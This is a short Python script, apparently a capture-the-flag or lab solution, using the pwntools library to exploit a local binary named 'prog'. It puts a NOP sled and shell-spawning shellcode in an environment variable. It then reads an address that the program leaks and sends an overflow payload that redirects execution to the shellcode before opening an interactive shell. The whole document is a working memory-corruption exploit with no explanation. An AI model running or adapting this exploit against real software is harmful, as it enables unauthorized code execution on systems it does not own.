from pwn import *

context.binary = 'prog'
e = context.binary

duzo = 0x1ffcd
argz = {'A':asm('nop')*duzo + asm(shellcraft.sh())}

p = e.process(env=argz)
p.readuntil(b' at')
addr = int(p.readline(), 0) + duzo
payload = b'\x00'*(1+context.bytes)
payload += pack(addr)
p.sendline(payload)
p.interactive()
